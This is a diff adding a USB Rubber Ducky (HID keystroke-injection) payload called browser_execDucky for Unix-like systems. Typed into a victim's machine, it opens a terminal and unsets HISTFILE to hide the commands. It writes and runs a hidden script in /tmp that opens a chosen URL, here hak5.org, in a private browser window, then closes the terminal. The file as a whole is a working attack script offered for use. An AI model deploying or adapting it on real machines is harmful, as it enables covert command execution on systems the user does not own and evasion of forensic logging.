@@ -1,0 +1,22 @@
+REM Title: browser_execDucky
+REM Description: browser_execDucky finds browser installed in target's system and searche URL in it.
+REM AUTHOR: drapl0n
+REM Version: 1.0
+REM Category: Execution.
+REM Target: Unix-like operating systems.
+REM Attackmodes: HID
+
+DELAY 1000
+CTRL ALT t
+DELAY 500
+STRING unset HISTFILE 
+ENTER
+DELAY 100
+STRING echo -e "url=hak5.org             \n#\!/bin/bash\nfunction browser(){\n\tbrowser=\$(ls /bin/ | grep -Ew 'firefox|chromium|brave'| head -1)\n\tif [ \"\$browser\" = firefox ]; then\n\t\texecBrowser=\$(echo \$browser --private-window)\n\t\texport execBrowser\n\telif [ \"\$browser\" = chromium ]; then\n\t\texecBrowser=\$(echo \$browser --incognito)\n\t\texport execBrowser\n\telif [ \"\$browser\" = brave ]; then\n\t\texecBrowser=\$(echo \$browser --incognito)\n\t\texport execBrowser\n\telse\n\t\techo \"Browser not found.\"\n\tfi\n}\nbrowser\n\$execBrowser \$url " > /tmp/sys
+ENTER
+DELAY 200
+STRING chmod +x /tmp/sys
+ENTER
+DELAY 200
+STRING /tmp/./sys & disown && exit
+ENTER
